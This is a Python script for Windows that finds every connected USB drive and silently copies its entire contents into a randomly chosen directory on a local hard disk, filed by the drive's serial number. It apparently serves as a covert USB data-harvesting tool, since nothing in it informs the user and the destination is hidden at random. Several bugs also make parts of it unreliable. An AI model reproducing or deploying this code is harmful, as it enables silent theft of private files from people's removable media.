import wmi
import shutil
import os
import random
from concurrent.futures import ThreadPoolExecutor, as_completed


_WMI = wmi.WMI()


def __get_usb_devices():
    usbs = []
    for device in _WMI.Win32_DiskDrive():
        if device.InterfaceType == "USB" and device.Status == "OK":
            usbs.append(device)
    return usbs


def __get_drive_devices():
    drives = []
    for device in _WMI.Win32_DiskDrive():
        if device.InterfaceType == "SCSI" and device.Status == "OK":
            drives.append(device)
    return drives


def __get_usb_devices_data():
    usbs = __get_usb_devices()
    usbs_data = []

    for usb in usbs:
        for disk in _WMI.query(f"SELECT * FROM Win32_DiskDrive WHERE MediaType = \"Removable Media\" AND Status = \"OK\" AND DeviceID = \"{usb.DeviceId}\""):
            for partition in _WMI.query('ASSOCIATORS OF {Win32_DiskDrive.DeviceID="' + disk.DeviceID + '"} WHERE AssocClass = Win32_DiskDriveToDiskPartition'):
                for logical_disk in _WMI.query('ASSOCIATORS OF {Win32_DiskPartition.DeviceID="' + partition.DeviceID + '"} WHERE AssocClass = Win32_LogicalDiskToPartition'):
                    used_space = int(logical_disk.Size) - int(logical_disk.FreeSpace)
                    usbs_data.append({
                        "serial_number": disk.SerialNumber,
                        "drive_letter": logical_disk.DeviceID,
                        "used_space": used_space
                    })
    return usbs_data


def __get_drive_devices_data():
    drives = __get_drive_devices()
    drives_data = []
    for drive in drives:
        for disk in _WMI.query(f"SELECT * FROM Win32_DiskDrive WHERE MediaType = \"Fixed hard disk media\" AND Status = \"OK\" AND DeviceID = \"{drive.DeviceId}\""):
            for partition in _WMI.query('ASSOCIATORS OF {Win32_DiskDrive.DeviceID="' + disk.DeviceID + '"} WHERE AssocClass = Win32_DiskDriveToDiskPartition'):
                for logical_disk in _WMI.query('ASSOCIATORS OF {Win32_DiskPartition.DeviceID="' + partition.DeviceID + '"} WHERE AssocClass = Win32_LogicalDiskToPartition'):
                    drives_data.append({
                        "drive_letter": logical_disk.DeviceID,
                        "free_space": int(logical_disk.FreeSpace)
                    })
    return drives_data


def __get_total_transfer_size_needed():
    sum = 0
    usbs_data = __get_usb_devices_data()
    for record in usbs_data:
        sum += record['used_space']
    return sum


def __get_random_drive_to_transfer_to():
    total_transfer_size = __get_total_transfer_size_needed()
    drives = __get_drive_devices_data()
    suitable_drives = []

    for drive in drives:
        if drive['free_space'] > total_transfer_size:
            suitable_drives.append(drive)

    return random.choice(suitable_drives)


def __walklevel(some_dir, level=1):
    some_dir = some_dir.rstrip(os.path.sep)
    assert os.path.isdir(some_dir)
    num_sep = some_dir.count(os.path.sep)
    for root, dirs, _ in os.walk(some_dir):
        yield root
        num_sep_this = root.count(os.path.sep)
        if num_sep + level <= num_sep_this:
            del dirs[:]


def __get_random_path_in_drive(drive):
    drive_letter = drive['drive_letter']
    paths = list(__walklevel(drive_letter + "\\", 3))
    return paths[random.randint(0,len(paths))].replace(":",":\\")


def __copy_directory(source, dest, serial_number):
    shutil.copytree(source,  dest + f"\\usbs\\{serial_number}", dirs_exist_ok=True)


def __threading_usb_data_copy(dest):
    usbs_data = __get_usb_devices_data()

    for record in usbs_data:
        drive_letter = f"{record['drive_letter']}\\"
        serial_number = record['serial_number']

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(__copy_directory, drive_letter, dest, serial_number)]

        for future in as_completed(futures):
            try:
                return future.result()
            except PermissionError:
                raise


def __are_usbs_conncted():
    return len(__get_usb_devices()) > 0


def copy_usbs_data():
    if not __are_usbs_conncted():
        return "[ERROR] No usbs are connected"

    drive = __get_random_drive_to_transfer_to()

    if drive is None:
        return "[ERROR] Drives don't have enough space to copy to"
    else:
        succeeded = False
        while succeeded != True:
            random_path = __get_random_path_in_drive(drive)
            try:
                __threading_usb_data_copy(random_path)
                succeeded = True
            except PermissionError:
                continue
        return random_path
